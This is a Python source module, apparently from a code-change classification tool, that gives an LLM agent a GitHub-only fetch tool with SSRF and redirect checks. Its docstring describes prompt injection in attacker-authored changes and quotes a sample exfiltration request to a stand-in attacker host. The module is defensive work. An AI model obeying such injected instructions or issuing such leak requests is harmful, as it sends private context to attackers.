"""GitHub-allowlisted enrichment fetch (MF2) — pull ADDITIONAL context for a change from GitHub only.

The threat model here is sharper than a normal fetch tool's: the change under classification is
ATTACKER-AUTHORED, so an injected instruction could try to steer a fetcher into
`GET https://attacker.tld/?leak=<context>` — a data-exfiltration channel. rlm-kit's SSRF guard blocks
INTERNAL/metadata targets, but an attacker-EXTERNAL URL is its allowed case. So this wrapper adds a HOST
ALLOWLIST on top: only GitHub API/content hosts are reachable, and there is no way to fetch a
"referenced URL" the change names. Enrichment is OFF by default (`enable_fetch=False`) for the same
reason — turn it on only when you need to pull the full file/commit context and trust the GitHub hosts.

Base/wrap split: the SSRF primitives (`is_safe_url`, `resolved_host_is_safe`, `parse_cidrs`) are the kit's;
this module owns the allowlist + the httpx provider + tracing. Sync (dspy invokes tools synchronously).
"""

from __future__ import annotations

from typing import Callable
from urllib.parse import urlparse

from rlm_kit.tools import is_safe_url, parse_cidrs, resolved_host_is_safe
from rlm_kit.trace import record_tool_call

from .config import DetectConfig

_PREVIEW_CHARS = 900


def _host_allowed(url: str, allowed_hosts: tuple[str, ...]) -> bool:
    host = (urlparse(url).hostname or "").lower()
    return bool(host) and host in {h.lower() for h in allowed_hosts}


def _port_for(parsed) -> int:
    if parsed.port:
        return parsed.port
    return 443 if parsed.scheme.lower() == "https" else 80


def make_github_fetch_tool(config: DetectConfig) -> Callable[[str], str]:
    """Build the sync `fetch_url(url)` tool, allowlisted to `config.github_hosts`. Refuses any non-GitHub
    or internal target (an exfil attempt on attacker-authored input), then applies the kit's DNS-rebinding
    resolved-IP re-check on every redirect hop."""
    allowed_hosts = tuple(config.github_hosts)
    allow_nets = parse_cidrs(config.fetch_allow_cidrs)
    max_bytes = config.fetch_max_bytes
    timeout = config.fetch_timeout

    def fetch_url(url: str) -> str:
        """Fetch ADDITIONAL context from GitHub (a full file, a commit, a PR page). Only GitHub hosts are
        reachable; any other or internal URL is refused. Store the result in a REPL variable and slice it."""
        u = (url or "").strip()
        if not is_safe_url(u) or not _host_allowed(u, allowed_hosts):
            record_tool_call("fetch_url", args={"url": url}, ok=False,
                             note="refused: only GitHub hosts are permitted for enrichment")
            return (f"Refused: {u!r} is not an allowed GitHub host. Enrichment is restricted to "
                    f"{', '.join(allowed_hosts)} — a non-GitHub URL in the change is untrusted and not fetched.")
        try:
            import httpx

            cur = u
            with httpx.Client(timeout=timeout, follow_redirects=False,
                              headers={"User-Agent": "diff-sentry/0.1 (+enrichment)"}) as client:
                for _hop in range(5):
                    p = urlparse(cur)
                    if not (_host_allowed(cur, allowed_hosts)
                            and resolved_host_is_safe(p.hostname or "", _port_for(p), allow_nets=allow_nets)):
                        record_tool_call("fetch_url", args={"url": url}, ok=False,
                                         note="refused: redirect left the GitHub allowlist or resolved internal")
                        return f"Refused: {cur!r} left the GitHub allowlist or resolved to an internal address."
                    with client.stream("GET", cur) as resp:
                        if resp.is_redirect:
                            loc = resp.headers.get("location", "")
                            if not loc:
                                break
                            cur = str(httpx.URL(cur).join(loc))
                            continue
                        chunks, total = [], 0
                        for chunk in resp.iter_bytes():
                            chunks.append(chunk)
                            total += len(chunk)
                            if total >= max_bytes:
                                break
                        body = b"".join(chunks)[:max_bytes].decode("utf-8", "replace")
                        record_tool_call("fetch_url", args={"url": url}, ok=True, bytes=total,
                                         final_url=cur, status=resp.status_code,
                                         preview=body[:_PREVIEW_CHARS])
                        return body
                record_tool_call("fetch_url", args={"url": url}, ok=False, note="too many redirects")
                return f"Refused: too many redirects starting from {u!r}."
        except Exception as exc:  # noqa: BLE001 — surface as text so the RLM can react
            record_tool_call("fetch_url", args={"url": url}, ok=False, note=f"error: {type(exc).__name__}")
            return f"Fetch error for {u!r}: {type(exc).__name__}: {str(exc)[:160]}"

    return fetch_url
